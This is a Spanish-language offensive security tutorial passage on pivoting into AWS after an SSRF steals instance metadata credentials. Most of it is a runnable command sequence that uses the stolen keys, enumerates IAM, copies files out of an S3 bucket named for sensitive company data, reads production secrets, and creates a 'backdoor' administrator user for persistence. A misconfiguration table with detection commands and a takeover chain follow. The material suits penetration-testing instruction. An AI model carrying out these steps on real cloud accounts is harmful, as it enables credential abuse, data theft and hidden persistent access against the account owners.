## Después del SSRF: el pivot a la nube

Ya sabes que SSRF puede alcanzar `169.254.169.254` para robar IAM credentials. ¿Qué
haces CON esas credenciales?

```bash
# Configurar las credenciales robadas
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Enumerar: ¿quién soy?
aws sts get-caller-identity

# ¿Qué puedo hacer?
aws iam list-attached-user-policies
aws iam list-roles

# ¿Hay buckets S3?
aws s3 ls
aws s3 ls s3://empresa-datos-sensibles/
aws s3 cp s3://empresa-datos-sensibles/credenciales.txt .

# ¿Secrets Manager?
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id production/db

# ¿Puedo crear usuarios nuevos (persistencia)?
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Las misconfigurations que encontrarás SIEMPRE

| Misconfig | Impacto | Comando de detección |
|---|---|---|
| **S3 público** | fuga de datos | `aws s3api get-bucket-acl --bucket NAME` |
| **IAM role sobre-permisionado** | escalada | `aws iam simulate-principal-policy` |
| **Lambda con secrets en env** | credenciales | `aws lambda get-function-configuration` |
| **Security Group 0.0.0.0/0** | exposición | `aws ec2 describe-security-groups` |
| **Snapshot EBS público** | robo de disco | `aws ec2 describe-snapshots --owner-ids self` |
| **CloudTrail deshabilitado** | no hay logs | `aws cloudtrail describe-trails` |

## Pivot: de instancia a dominio total

```text
SSRF → metadata → IAM creds → S3 (datos) → lambda (persistencia)
                                      → EC2 (nueva instancia con key propia)
                                      → IAM (crear admin user)
                                      → TODO el account de AWS
```

En Azure/GCP es similar: el metadata endpoint entrega Managed Identity tokens que
pueden autenticar contra Azure AD → Graph API → todos los recursos.
